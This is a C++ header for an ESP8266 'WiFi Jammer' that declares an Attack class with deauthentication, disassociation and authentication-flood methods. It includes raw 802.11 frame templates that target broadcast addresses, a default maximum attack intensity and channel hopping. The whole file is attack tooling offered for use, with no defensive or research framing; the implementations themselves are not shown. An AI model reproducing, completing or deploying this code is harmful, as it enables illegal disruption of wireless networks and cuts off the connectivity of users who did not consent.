/* Simplified Attack Header for WiFi Jammer */

#pragma once

#include "Arduino.h"
#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

class Attack {
  public:
    Attack();
    
    void start(uint8_t* targetMAC, uint8_t channel);
    void stop();
    void update();
    
    bool isRunning();
    uint32_t getPacketsSent();
    uint32_t getPacketRate();
    
    // Additional attack configuration methods
    void setAttackIntensity(uint8_t intensity);  // 1-10 scale
    void enableChannelHopping(bool enable);
    
  private:
    void sendDeauthPacket(uint8_t* apMac, uint8_t* clientMac, uint8_t reason);
    void sendDisassocPacket(uint8_t* apMac, uint8_t* clientMac, uint8_t reason);
    void sendAuthFlood(uint8_t* apMac);
    
    bool running = false;
    uint8_t targetMAC[6];
    uint8_t currentChannel = 1;
    uint32_t packetsSent = 0;
    uint32_t lastPacketCount = 0;
    uint32_t lastRateCheck = 0;
    uint32_t packetRate = 0;
    uint8_t attackIntensity = 10;  // Default max intensity
    bool channelHoppingEnabled = false;
    
    // Packet templates - moved from main .ino file
    uint8_t deauthPacket[26] = {
            /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
            /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
            /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
            /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
            /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
            /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
            /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
    };
    uint8_t disassocPacket[26] = {
      0xA0, 0x00,  // Type/Subtype: Disassociation
      0x00, 0x00,  // Duration
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
      0x00, 0x00,  // Sequence
      0x08, 0x00   // Reason code
    };
    
    uint8_t authPacket[30] = {
      0xB0, 0x00,  // Type/Subtype: Authentication
      0x3A, 0x01,  // Duration
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Destination
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Source
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
      0x00, 0x00,  // Sequence
      0x00, 0x00,  // Auth algorithm
      0x01, 0x00,  // Auth sequence
      0x00, 0x00   // Status code
    };
};
